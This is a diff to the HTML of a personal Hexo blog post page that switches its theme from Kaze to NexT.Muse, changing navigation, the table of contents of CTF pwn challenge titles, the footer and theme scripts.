-        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
-      </div>
-    
-  </div>
-</article>
-<div class="nav">
-  
-    <div class="nav-item-prev">
-      <a 
-        href="/2022/03/31/babyheap/" 
-        class="nav-link">
-        <i class="iconfont icon-left nav-prev-icon"></i>
-        <div>
-          <div class="nav-label">Prev</div>
-          
-            <div class="nav-title">0ctf2017_babyheap（学长的wp微改，学习用） </div>
-          
-        </div>
-      </a>
     </div>
-  
-  
-    <div class="nav-item-next">
-      <a 
-        href="/2022/01/16/%E6%80%BB%E7%BB%93/" 
-        class="nav-link">
-        <div>
-          <div class="nav-label">Next</div>
-          
-            <div class="nav-title">总结 </div>
-          
-        </div>
-        <i class="iconfont icon-right nav-next-icon"></i>
-      </a>
-    </div>
-  
-</div>
 
-<div 
-  class="card card-content toc-card" 
-  id="mobiletoc">
-  <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#basic-file-exploit"><span class="toc-text">basic-file-exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-text">buffer overflow 0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E3%80%8Aret2text%E3%80%8B"><span class="toc-text">一道简单的栈溢出题《ret2text》</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-XXXX-XXXX"><span class="toc-text">CVE-XXXX-XXXX</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-text">buffer overflow 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RPS"><span class="toc-text">RPS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x-sixty-what"><span class="toc-text">x-sixty-what</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%8464%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE"><span class="toc-text">一道简单的64位栈溢出题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-2"><span class="toc-text">buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E8%80%83%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%EF%BC%8C32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BB%8E%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%8E%E4%B8%A4%E4%B8%AA0x8%E5%BC%80%E5%A7%8B%EF%BC%88%E9%9C%80%E8%A6%81%E4%BC%A0%E9%80%9216%E8%BF%9B%E5%88%B6%E7%9A%84%E6%95%B0%EF%BC%89"><span class="toc-text">本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-leak"><span class="toc-text">flag leak</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#canary"><span class="toc-text">canary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run1"><span class="toc-text">file-run1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run2"><span class="toc-text">file-run2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#patchme-py"><span class="toc-text">patchme.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%BE%97%E5%88%86"><span class="toc-text">最后得分</span></a></li></ol>
-</div>
-            </main>
-            <aside class="right-column">
-              <div class="sticky-widescreen">
-  
-  
-    <article class="card card-content toc-card">
-      <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#basic-file-exploit"><span class="toc-text">basic-file-exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-text">buffer overflow 0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E3%80%8Aret2text%E3%80%8B"><span class="toc-text">一道简单的栈溢出题《ret2text》</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-XXXX-XXXX"><span class="toc-text">CVE-XXXX-XXXX</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-text">buffer overflow 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RPS"><span class="toc-text">RPS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x-sixty-what"><span class="toc-text">x-sixty-what</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%8464%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE"><span class="toc-text">一道简单的64位栈溢出题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-2"><span class="toc-text">buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E8%80%83%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%EF%BC%8C32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BB%8E%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%8E%E4%B8%A4%E4%B8%AA0x8%E5%BC%80%E5%A7%8B%EF%BC%88%E9%9C%80%E8%A6%81%E4%BC%A0%E9%80%9216%E8%BF%9B%E5%88%B6%E7%9A%84%E6%95%B0%EF%BC%89"><span class="toc-text">本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-leak"><span class="toc-text">flag leak</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#canary"><span class="toc-text">canary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run1"><span class="toc-text">file-run1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run2"><span class="toc-text">file-run2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#patchme-py"><span class="toc-text">patchme.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%BE%97%E5%88%86"><span class="toc-text">最后得分</span></a></li></ol>
-    </article>
-  
-  
-  <article class="card card-content">
-    <div class="recent-posts-card">
-  <div class="recent-posts-header">
-    <i 
-      class="iconfont icon-wenzhang_huaban" 
-      style="padding-right: 2px;">
-    </i>Recent Posts
-  </div>
-  <div class="recent-posts-list">
     
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-20</div>
-        <a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"><div class="recent-posts-item-content">DASCTF_X_CBCTF_2022九月挑战赛</div></a>
-      </div>
     
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-14</div>
-        <a href="/2022/09/14/house-of-cat/"><div class="recent-posts-item-content">house_of_cat</div></a>
-      </div>
     
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-12</div>
-        <a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/"><div class="recent-posts-item-content">周报模板</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2022-09-07</div>
-        <a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/"><div class="recent-posts-item-content">io_file利用</div></a>
-      </div>
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/16/%E6%80%BB%E7%BB%93/" rel="prev" title="总结">
+                  <i class="fa fa-chevron-left"></i> 总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/31/babyheap/" rel="next" title="0ctf2017_babyheap（学长的wp微改，学习用）">
+                  0ctf2017_babyheap（学长的wp微改，学习用） <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
           </div>
-        </div>
-      </div>
-    </div>
-     
-    <footer class="footer">
-  <div class="footer-container">
-    <div>
-      <div class="footer-dsc">
-        <span>
-          Copyright ©
-          
-            2020
-          
-          
-                - 
-                2022
-          
-        </span>
-        &nbsp;
-        <a 
-          href="/" 
-          class="footer-link">
-          幽林
-        </a>
-      </div>
-    </div>
+    </footer>
+  </article>
+</div>
 
-    
-      <div class="footer-dsc">
-        
-          Powered by
-          <a 
-            href="https://hexo.io/" 
-            class="footer-link" 
-            target="_blank" 
-            rel="nofollow noopener noreferrer">
-            &nbsp;Hexo
-          </a>
-        
-        
-          <span>&nbsp;|&nbsp;</span>
-        
-        
-          Theme -
-          <a 
-            href="https://github.com/theme-kaze" 
-            class="footer-link" 
-            target="_blank"
-            rel="nofollow noopener noreferrer">
-            &nbsp;Kaze
-          </a>
-        
-      </div>
-    
-    
-    
-    
-</footer>
- 
-    
-  <a 
-    role="button" 
-    id="scrollbutton" 
-    class="basebutton" 
-    aria-label="回到顶部">
-    <i class="iconfont icon-arrowleft button-icon"></i>
-  </a>
 
-<a 
-  role="button" 
-  id="menubutton"
-  aria-label="menu button"
-  class="basebutton">
-  <i class="iconfont icon-menu button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="popbutton" 
-  class="basebutton" 
-  aria-label="控制中心">
-  <i class="iconfont icon-expand button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="darkbutton" 
-  class="basebutton darkwidget" 
-  aria-label="夜色模式">
-  <i class="iconfont icon-weather button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="searchbutton" 
-  class="basebutton searchwidget" 
-  aria-label="搜索">
-  <i class="iconfont icon-search button-icon"></i>
-</a> 
-     
-     
-     
-      <script>
-  var addImgLayout = function () {
-    var img = document.querySelectorAll('.post-content img')
-    var i
-    for (i = 0; i < img.length; i++) {
-      var wrapper = document.createElement('a')
-      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
-      wrapper.setAttribute('aria-label', 'illustration')
-      wrapper.style.cssText =
-        'width: 100%; display: flex; justify-content: center;'
-      if (img[i].alt) wrapper.dataset.caption = img[i].alt
-      wrapper.dataset.nolink = true
-      img[i].before(wrapper)
-      wrapper.append(img[i])
-      var divWrap = document.createElement('div')
-      divWrap.classList.add('gallery')
-      wrapper.before(divWrap)
-      divWrap.append(wrapper)
-    }
-    baguetteBox.run('.gallery')
-  }
-</script>
-<script>
-  loadScript(
-    "/js/lib/lightbox/baguetteBox.min.js",
-    addImgLayout
-  )
-</script>
- 
-     
-     
-    <script src="/js/main.js"></script> 
-     
-    
-      <script>
-        var addLazyload = function () {
-          var observer = lozad('.lozad', {
-            load: function (el) {
-              el.srcset = el.getAttribute('data-src')
-            },
-            loaded: function (el) {
-              el.classList.add('loaded')
-            },
-          })
-          observer.observe()
-        }
-      </script>
-      <script>
-        loadScript('/js/lib/lozad.min.js', addLazyload)
-      </script>
-    
-    <script src="//instant.page/5.1.0" type="module"
-      integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
-    
-    
-  </body>
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
 </html>
